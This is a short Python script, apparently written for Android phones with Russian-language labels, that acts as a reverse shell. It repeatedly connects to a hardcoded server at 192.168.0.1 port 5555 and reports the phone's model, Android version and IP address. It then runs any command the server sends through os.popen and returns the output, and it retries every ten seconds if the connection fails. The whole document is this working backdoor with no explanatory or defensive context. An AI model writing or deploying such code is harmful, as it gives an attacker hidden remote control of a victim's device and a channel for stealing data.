import os
import socket
import subprocess
import time

SERVER_IP = '192.168.0.1'
PORT = 5555

def get_info():
    info = f"""
=== ДАННЫЕ ТЕЛЕФОНА ===
Модель: {os.popen('getprop ro.product.model').read().strip()}
Андроид: {os.popen('getprop ro.build.version.release').read().strip()}
IP: {os.popen('ifconfig wlan0 | grep inet | awk "{print $2}"').read().strip()}
"""
    return info

while True:
    try:
        s = socket.socket()
        s.connect((SERVER_IP, PORT))
        s.send(get_info().encode())
        while True:
            cmd = s.recv(1024).decode()
            if not cmd: break
            if cmd.lower() == 'exit': break
            result = os.popen(cmd).read()
            s.send(result.encode() if result else b'OK')
        s.close()
    except:
        time.sleep(10)
